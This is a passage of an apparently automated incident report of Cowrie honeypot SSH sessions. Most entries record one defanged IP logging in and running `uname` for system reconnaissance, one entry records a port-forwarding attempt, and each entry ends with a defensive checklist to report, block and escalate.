| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:20` | `cowrie.session.connect` |
| `2026-08-08 06:57:20` | `cowrie.client.version` |
| `2026-08-08 06:57:20` | `cowrie.client.kex` |
| `2026-08-08 06:57:20` | `cowrie.login.success` |
| `2026-08-08 06:57:21` | `cowrie.session.params` |
| `2026-08-08 06:57:21` | `cowrie.command.input` |
| `2026-08-08 06:57:21` | `cowrie.log.closed` |
| `2026-08-08 06:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eafa9a806df

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:24` | `cowrie.session.connect` |
| `2026-08-08 06:57:24` | `cowrie.client.version` |
| `2026-08-08 06:57:24` | `cowrie.client.kex` |
| `2026-08-08 06:57:24` | `cowrie.login.success` |
| `2026-08-08 06:57:25` | `cowrie.session.params` |
| `2026-08-08 06:57:25` | `cowrie.command.input` |
| `2026-08-08 06:57:25` | `cowrie.log.closed` |
| `2026-08-08 06:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee0fb8756dc1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:28` | `cowrie.session.connect` |
| `2026-08-08 06:57:28` | `cowrie.client.version` |
| `2026-08-08 06:57:28` | `cowrie.client.kex` |
| `2026-08-08 06:57:28` | `cowrie.login.success` |
| `2026-08-08 06:57:29` | `cowrie.session.params` |
| `2026-08-08 06:57:29` | `cowrie.command.input` |
| `2026-08-08 06:57:29` | `cowrie.log.closed` |
| `2026-08-08 06:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa41e32b6117

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:32` | `cowrie.session.connect` |
| `2026-08-08 06:57:32` | `cowrie.client.version` |
| `2026-08-08 06:57:32` | `cowrie.client.kex` |
| `2026-08-08 06:57:32` | `cowrie.login.success` |
| `2026-08-08 06:57:33` | `cowrie.session.params` |
| `2026-08-08 06:57:33` | `cowrie.command.input` |
| `2026-08-08 06:57:33` | `cowrie.log.closed` |
| `2026-08-08 06:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d75a709b3954

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:36` | `cowrie.session.connect` |
| `2026-08-08 06:57:36` | `cowrie.client.version` |
| `2026-08-08 06:57:36` | `cowrie.client.kex` |
| `2026-08-08 06:57:36` | `cowrie.login.success` |
| `2026-08-08 06:57:37` | `cowrie.session.params` |
| `2026-08-08 06:57:37` | `cowrie.command.input` |
| `2026-08-08 06:57:37` | `cowrie.log.closed` |
| `2026-08-08 06:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-921be1109376

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:40` | `cowrie.session.connect` |
| `2026-08-08 06:57:40` | `cowrie.client.version` |
| `2026-08-08 06:57:40` | `cowrie.client.kex` |
| `2026-08-08 06:57:41` | `cowrie.login.success` |
| `2026-08-08 06:57:42` | `cowrie.session.params` |
| `2026-08-08 06:57:42` | `cowrie.command.input` |
| `2026-08-08 06:57:42` | `cowrie.log.closed` |
| `2026-08-08 06:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68925e3bc190

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:44` | `cowrie.session.connect` |
| `2026-08-08 06:57:44` | `cowrie.client.version` |
| `2026-08-08 06:57:44` | `cowrie.client.kex` |
| `2026-08-08 06:57:45` | `cowrie.login.success` |
| `2026-08-08 06:57:45` | `cowrie.session.params` |
| `2026-08-08 06:57:45` | `cowrie.command.input` |
| `2026-08-08 06:57:46` | `cowrie.log.closed` |
| `2026-08-08 06:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eaad42a4c97

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:48` | `cowrie.session.connect` |
| `2026-08-08 06:57:48` | `cowrie.client.version` |
| `2026-08-08 06:57:48` | `cowrie.client.kex` |
| `2026-08-08 06:57:48` | `cowrie.login.success` |
| `2026-08-08 06:57:49` | `cowrie.session.params` |
| `2026-08-08 06:57:49` | `cowrie.command.input` |
| `2026-08-08 06:57:49` | `cowrie.log.closed` |
| `2026-08-08 06:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3eaf1cced14

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:52` | `cowrie.session.connect` |
| `2026-08-08 06:57:52` | `cowrie.client.version` |
| `2026-08-08 06:57:52` | `cowrie.client.kex` |
| `2026-08-08 06:57:53` | `cowrie.login.success` |
| `2026-08-08 06:57:54` | `cowrie.session.params` |
| `2026-08-08 06:57:54` | `cowrie.command.input` |
| `2026-08-08 06:57:54` | `cowrie.log.closed` |
| `2026-08-08 06:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e67a7880937

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:57 |
| **Last Seen** | 2026-08-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:57:56` | `cowrie.session.connect` |
| `2026-08-08 06:57:56` | `cowrie.client.version` |
| `2026-08-08 06:57:56` | `cowrie.client.kex` |
| `2026-08-08 06:57:57` | `cowrie.login.success` |
| `2026-08-08 06:57:58` | `cowrie.session.params` |
| `2026-08-08 06:57:58` | `cowrie.command.input` |
| `2026-08-08 06:57:58` | `cowrie.log.closed` |
| `2026-08-08 06:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b4485447b71

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:01` | `cowrie.session.connect` |
| `2026-08-08 06:58:01` | `cowrie.client.version` |
| `2026-08-08 06:58:01` | `cowrie.client.kex` |
| `2026-08-08 06:58:01` | `cowrie.login.success` |
| `2026-08-08 06:58:02` | `cowrie.session.params` |
| `2026-08-08 06:58:02` | `cowrie.command.input` |
| `2026-08-08 06:58:02` | `cowrie.log.closed` |
| `2026-08-08 06:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb773417b46

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:04` | `cowrie.session.connect` |
| `2026-08-08 06:58:04` | `cowrie.client.version` |
| `2026-08-08 06:58:05` | `cowrie.client.kex` |
| `2026-08-08 06:58:05` | `cowrie.login.success` |
| `2026-08-08 06:58:06` | `cowrie.session.params` |
| `2026-08-08 06:58:06` | `cowrie.command.input` |
| `2026-08-08 06:58:06` | `cowrie.log.closed` |
| `2026-08-08 06:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d807ce8c246f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:09` | `cowrie.session.connect` |
| `2026-08-08 06:58:09` | `cowrie.client.version` |
| `2026-08-08 06:58:09` | `cowrie.client.kex` |
| `2026-08-08 06:58:09` | `cowrie.login.success` |
| `2026-08-08 06:58:10` | `cowrie.session.params` |
| `2026-08-08 06:58:10` | `cowrie.command.input` |
| `2026-08-08 06:58:10` | `cowrie.log.closed` |
| `2026-08-08 06:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be663308851

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:13` | `cowrie.session.connect` |
| `2026-08-08 06:58:13` | `cowrie.client.version` |
| `2026-08-08 06:58:13` | `cowrie.client.kex` |
| `2026-08-08 06:58:13` | `cowrie.login.success` |
| `2026-08-08 06:58:14` | `cowrie.session.params` |
| `2026-08-08 06:58:14` | `cowrie.command.input` |
| `2026-08-08 06:58:14` | `cowrie.log.closed` |
| `2026-08-08 06:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b019b9b9821e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:17` | `cowrie.session.connect` |
| `2026-08-08 06:58:17` | `cowrie.client.version` |
| `2026-08-08 06:58:17` | `cowrie.client.kex` |
| `2026-08-08 06:58:17` | `cowrie.login.success` |
| `2026-08-08 06:58:18` | `cowrie.session.params` |
| `2026-08-08 06:58:18` | `cowrie.command.input` |
| `2026-08-08 06:58:18` | `cowrie.log.closed` |
| `2026-08-08 06:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94224cfd1633

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:21` | `cowrie.session.connect` |
| `2026-08-08 06:58:21` | `cowrie.client.version` |
| `2026-08-08 06:58:21` | `cowrie.client.kex` |
| `2026-08-08 06:58:21` | `cowrie.login.success` |
| `2026-08-08 06:58:22` | `cowrie.session.params` |
| `2026-08-08 06:58:22` | `cowrie.command.input` |
| `2026-08-08 06:58:22` | `cowrie.log.closed` |
| `2026-08-08 06:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf88cba3054

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:25` | `cowrie.session.connect` |
| `2026-08-08 06:58:25` | `cowrie.client.version` |
| `2026-08-08 06:58:25` | `cowrie.client.kex` |
| `2026-08-08 06:58:25` | `cowrie.login.success` |
| `2026-08-08 06:58:26` | `cowrie.session.params` |
| `2026-08-08 06:58:26` | `cowrie.command.input` |
| `2026-08-08 06:58:27` | `cowrie.log.closed` |
| `2026-08-08 06:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afb5fe0411e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:29` | `cowrie.session.connect` |
| `2026-08-08 06:58:29` | `cowrie.client.version` |
| `2026-08-08 06:58:29` | `cowrie.client.kex` |
| `2026-08-08 06:58:29` | `cowrie.login.success` |
| `2026-08-08 06:58:30` | `cowrie.session.params` |
| `2026-08-08 06:58:30` | `cowrie.command.input` |
| `2026-08-08 06:58:30` | `cowrie.log.closed` |
| `2026-08-08 06:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-121b71e0d8e9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:33` | `cowrie.session.connect` |
| `2026-08-08 06:58:33` | `cowrie.client.version` |
| `2026-08-08 06:58:33` | `cowrie.client.kex` |
| `2026-08-08 06:58:34` | `cowrie.login.success` |
| `2026-08-08 06:58:34` | `cowrie.session.params` |
| `2026-08-08 06:58:34` | `cowrie.command.input` |
| `2026-08-08 06:58:35` | `cowrie.log.closed` |
| `2026-08-08 06:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c6b91498d0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:37` | `cowrie.session.connect` |
| `2026-08-08 06:58:37` | `cowrie.client.version` |
| `2026-08-08 06:58:38` | `cowrie.client.kex` |
| `2026-08-08 06:58:38` | `cowrie.login.success` |
| `2026-08-08 06:58:39` | `cowrie.session.params` |
| `2026-08-08 06:58:39` | `cowrie.command.input` |
| `2026-08-08 06:58:39` | `cowrie.log.closed` |
| `2026-08-08 06:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b35cebac170c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:41` | `cowrie.session.connect` |
| `2026-08-08 06:58:41` | `cowrie.client.version` |
| `2026-08-08 06:58:41` | `cowrie.client.kex` |
| `2026-08-08 06:58:42` | `cowrie.login.success` |
| `2026-08-08 06:58:42` | `cowrie.session.params` |
| `2026-08-08 06:58:42` | `cowrie.command.input` |
| `2026-08-08 06:58:43` | `cowrie.log.closed` |
| `2026-08-08 06:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675673596e2c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:45` | `cowrie.session.connect` |
| `2026-08-08 06:58:45` | `cowrie.client.version` |
| `2026-08-08 06:58:45` | `cowrie.client.kex` |
| `2026-08-08 06:58:46` | `cowrie.login.success` |
| `2026-08-08 06:58:47` | `cowrie.session.params` |
| `2026-08-08 06:58:47` | `cowrie.command.input` |
| `2026-08-08 06:58:47` | `cowrie.log.closed` |
| `2026-08-08 06:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f874ff0c82a9

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:48` | `cowrie.session.connect` |
| `2026-08-08 06:58:48` | `cowrie.client.version` |
| `2026-08-08 06:58:48` | `cowrie.client.kex` |
| `2026-08-08 06:58:51` | `cowrie.login.success` |
| `2026-08-08 06:58:52` | `cowrie.direct-tcpip.request` |
| `2026-08-08 06:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621cf11aecee

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:49` | `cowrie.session.connect` |
| `2026-08-08 06:58:49` | `cowrie.client.version` |
| `2026-08-08 06:58:49` | `cowrie.client.kex` |
| `2026-08-08 06:58:50` | `cowrie.login.success` |
| `2026-08-08 06:58:51` | `cowrie.session.params` |
| `2026-08-08 06:58:51` | `cowrie.command.input` |
| `2026-08-08 06:58:51` | `cowrie.log.closed` |
| `2026-08-08 06:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19cf573e3c2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:53` | `cowrie.session.connect` |
| `2026-08-08 06:58:54` | `cowrie.client.version` |
| `2026-08-08 06:58:54` | `cowrie.client.kex` |
| `2026-08-08 06:58:54` | `cowrie.login.success` |
| `2026-08-08 06:58:55` | `cowrie.session.params` |
| `2026-08-08 06:58:55` | `cowrie.command.input` |
| `2026-08-08 06:58:55` | `cowrie.log.closed` |
| `2026-08-08 06:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ea4abc5d13

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:58 |
| **Last Seen** | 2026-08-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:58:58` | `cowrie.session.connect` |
| `2026-08-08 06:58:58` | `cowrie.client.version` |
| `2026-08-08 06:58:58` | `cowrie.client.kex` |
| `2026-08-08 06:58:58` | `cowrie.login.success` |
| `2026-08-08 06:58:59` | `cowrie.session.params` |
| `2026-08-08 06:58:59` | `cowrie.command.input` |
| `2026-08-08 06:58:59` | `cowrie.log.closed` |
| `2026-08-08 06:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
